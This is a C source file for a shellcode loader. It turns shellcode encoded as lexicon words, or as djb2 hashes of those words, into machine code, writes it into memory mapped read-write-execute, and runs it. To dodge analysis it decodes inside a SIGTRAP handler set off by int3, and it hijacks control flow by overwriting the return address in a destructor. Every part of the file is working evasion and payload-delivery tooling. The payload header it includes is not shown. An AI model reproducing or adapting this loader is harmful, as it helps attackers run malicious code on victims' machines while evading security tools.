#include "lexicon.h"

#include <assert.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "shellcode.h"

// Ensure that the lookup table size is at least 256 elements
// 256 elements are required to map all bytes from 0x00 to 0xFF
static_assert(
    sizeof(LOOKUP_TABLE) / sizeof(LOOKUP_TABLE[0]) >= 256,
    "Lookup table size must be larger than 256"
);

// Calculate the number of bytes in the shellcode
static const long CODE_SIZE = sizeof(SHELLCODE) / sizeof(SHELLCODE[0]);

// Global variables
sigjmp_buf g_jump_buffer;
uint8_t* g_executable_memory;

#ifdef DJB2
[[gnu::always_inline]]
static inline unsigned long djb2(const char* str) {
    unsigned long hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = (((hash << 5) + hash) + c) & 0xFFFFFFFF;
    }
    return hash;
}
#endif

// Function to find the hex value for a word
[[gnu::always_inline]]
static inline uint8_t find_hex_value(const char* word) {
    for (int i = 0; i < sizeof(LOOKUP_TABLE) / sizeof(LOOKUP_TABLE[0]); i++) {
#ifdef DJB2
        if (djb2(word) == LOOKUP_TABLE[i]) {
#else
        if (strcmp(word, LOOKUP_TABLE[i]) == 0) {
#endif
            return i;
        }
    }
    // Return 0x90 (NOP) if the word is not found
    // This also allows the use of undefined words for representing NOP
#ifdef DEBUG
    printf("Word not found: %s\n", word);
#endif
    return 0x90;
}

void decode_shellcode_bytes(int signum) {
    size_t offset = 0;
    for (int i = 0; i < CODE_SIZE; i++) {
        uint8_t hex_value = find_hex_value(SHELLCODE[i]);
#ifdef DEBUG
        printf("%s -> 0x%02x\n", SHELLCODE[i], hex_value);
#endif
        g_executable_memory[offset++] = hex_value;
    }
    siglongjmp(g_jump_buffer, 1);
}

[[gnu::constructor]]
void alloc_exec_mem() {
    // Allocate executable memory
    g_executable_memory = mmap(
        NULL, CODE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
    );
    if (g_executable_memory == MAP_FAILED) {
#ifdef DEBUG
        perror("Failed to allocate memory");
#endif
        exit(EXIT_FAILURE);
    }

    // Write exit(-1) into the allocated memory
    // mov rax, 60
    g_executable_memory[0] = 0x48;
    g_executable_memory[1] = 0xc7;
    g_executable_memory[2] = 0xc0;
    g_executable_memory[3] = 0x3c;
    g_executable_memory[4] = 0x00;
    g_executable_memory[5] = 0x00;
    g_executable_memory[6] = 0x00;

    // mov rdi, -1
    g_executable_memory[7] = 0x48;
    g_executable_memory[8] = 0x31;
    g_executable_memory[9] = 0xff;

    // syscall
    g_executable_memory[10] = 0x0f;
    g_executable_memory[11] = 0x05;
}

// Stub for compiler
// This gets executed between the constructor and destructor
int main(void) {
    __asm__("ret");
}

[[gnu::destructor]]
void entrypoint(void) {
    // Overwrite the return address on the stack
    __asm__("movq %0, +8(%%rsp)" : : "r"(g_executable_memory));

#if defined(DEBUG) || defined(NOSIGNAL)
    if (sigsetjmp(g_jump_buffer, 1) == 0) {
        decode_shellcode_bytes(0);
    }
#else
    // Register signal handler to catch SIGTRAP
    // The int3 below will trigger the signal and decode the shellcode bytes
    signal(SIGTRAP, decode_shellcode_bytes);
    if (sigsetjmp(g_jump_buffer, 1) == 0) {
        __asm__("int3");
    }
#endif

    // You can also call the shellcode like a function instead if it returns properly.
    // This allows you to perform other operations after the shellcode executes.
    // Don't forget to remove the return address overwrite above if you do this.
    // void (*shellcode)() = (void (*)())g_executable_memory;
    // shellcode();
    // munmap(g_executable_memory, CODE_SIZE);

    // Since the return address has been overwritten,
    // the function return here will jump to the shellcode.
}
